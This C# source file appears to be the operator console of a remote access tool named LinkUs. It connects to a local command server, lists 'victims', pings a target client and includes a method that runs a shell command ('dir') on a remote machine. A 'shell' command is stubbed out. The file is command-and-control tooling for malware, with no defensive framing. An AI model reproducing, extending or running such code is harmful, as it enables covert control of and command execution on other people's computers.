using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading.Tasks;
using Fclp;
using LinkUs.Core;

namespace LinkUs.CommandLine
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Any() == false) {
                Console.WriteLine("Nothing to do");
                return;
            }

            var command = args.First();
            string commandResult = "";
            try {
                switch (command) {
                    case "ping":
                        commandResult = Ping(args.Skip(1).ToArray());
                        break;
                    case "list-victims":
                        commandResult = ListVictims();
                        break;
                    case "shell":
                        break;
                    default:
                        commandResult = $"'{command}' is not recognized as a command.";
                        break;
                }
            }
            catch (Exception ex) {
                WriteInnerException(ex);
            }

            Console.WriteLine(commandResult);
        }
        private static string ListVictims()
        {
            var commandDispatcher = GetCommandDispatcher();
            var defaultCommand = new Command() {Name = "list-victims"};
            return commandDispatcher.ExecuteAsync<Command, string>(defaultCommand).Result;
        }

        private static string Ping(string[] arguments)
        {
            var target = "";

            var p = new FluentCommandLineParser();
            p.Setup<string>('t', "target")
                .Callback(x => target = x)
                .Required();
            var result = p.Parse(arguments);
            if (result.HasErrors) {
                return result.ErrorText;
            }
            else {
                var commandDispatcher = GetCommandDispatcher();
                var targetId = ClientId.Parse(target);
                var stopWatch = new Stopwatch();
                stopWatch.Start();
                var pingCommand = new Command() {Name = "ping"};
                commandDispatcher.ExecuteAsync<Command, string>(pingCommand, targetId).Wait();
                stopWatch.Stop();
                return $"Ok. {stopWatch.ElapsedMilliseconds} ms.";
            }
        }
        private static CommandDispatcher GetCommandDispatcher()
        {
            string host = "127.0.0.1";
            int port = 9000;

            var connection = new SocketConnection();
            connection.Connect(host, port);
            var packageTransmitter = new PackageTransmitter(connection);
            return new CommandDispatcher(packageTransmitter, new JsonSerializer());
        }

        private static string ExecuteDir(CommandDispatcher commandDispatcher, string[] arguments)
        {
            var command = new ExecuteRemoteCommandLine {
                Name = "ExecuteRemoteCommandLine",
                CommandLine = "dir",
                Arguments = new List<object> { }
            };
            var targetId = ClientId.Parse(arguments[1]);
            var result = commandDispatcher.ExecuteAsync<ExecuteRemoteCommandLine, string>(command, targetId).Result;
            return result;
        }

        private static void WriteInnerException(Exception exception)
        {
            if (exception is AggregateException) {
                WriteInnerException(((AggregateException) exception).InnerException);
            }
            else {
                Console.WriteLine(exception);
            }
        }
    }
}